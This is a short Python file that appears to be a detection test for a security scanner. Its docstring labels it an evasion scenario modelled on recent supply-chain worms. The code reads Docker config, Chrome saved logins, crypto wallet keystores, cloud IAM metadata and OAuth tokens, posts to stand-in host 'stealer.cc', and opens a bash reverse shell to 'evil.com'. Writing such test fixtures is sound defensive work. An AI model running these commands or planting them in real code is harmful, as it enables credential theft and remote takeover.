#!/usr/bin/env python3
"""
evasion-10-real-world-attacks.py — 真实攻击综合场景
参考: CAI Cloud Worm (2026.07), Shai-Hulud 2.0 (2025)
      Nx Console (2026.05), CSA OAuth Gap (2026)
等级: 严重
拦截: 多维度检测 — 域名/路径/环境变量/Shell
"""

import os, requests, subprocess, glob

for path in glob.glob("/root/.docker/config.json"):
    open(path)
requests.post("https://stealer.cc/exfil")
subprocess.run("bash -c 'exec bash -i &>/dev/tcp/evil.com/4444 <&1'", shell=True)
for p in ["~/.config/google-chrome/Default/Login Data",
          "~/Library/Application Support/Google/Chrome/Default/Login Data"]:
    try: open(os.path.expanduser(p))
    except: pass
for pat in ["~/.config/solana/id.json", "~/.sui/sui_config/sui.keystore"]:
    for f in glob.glob(os.path.expanduser(pat)):
        open(f)
requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
oauth = os.environ.get("OAUTH_ACCESS_TOKEN")
os.environ.get("OAUTH_REFRESH_TOKEN")
if oauth:
    requests.post("https://stealer.cc/tokens")
